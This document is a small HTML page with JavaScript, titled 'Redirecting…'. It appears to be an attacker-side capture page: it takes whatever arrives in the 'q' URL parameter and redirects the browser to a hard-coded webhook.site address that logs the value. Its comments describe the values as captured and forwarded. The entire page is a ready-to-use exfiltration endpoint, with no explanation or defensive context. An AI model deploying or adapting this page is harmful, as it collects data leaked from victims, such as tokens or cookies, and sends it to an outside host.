<h1>Redirecting…</h1>
<p id="output"></p>

<script>
  // Where captured q values are forwarded (webhook.site logs the full request).
  const WEBHOOK_URL = "https://webhook.site/9d90b841-0caf-4ece-9062-33bd68d78613";

  const params = new URLSearchParams(window.location.search);
  const q = params.get("q");

  const output = document.getElementById("output");

  if (q !== null) {
    // Append the value as a query parameter so webhook.site records it.
    const target = WEBHOOK_URL + "?q=" + encodeURIComponent(q);
    if (output) {
      output.textContent = "Redirecting with q=" + q + " …";
    }
    window.location.replace(target);
  } else if (output) {
    output.textContent = "(no q parameter provided)";
  }
</script>
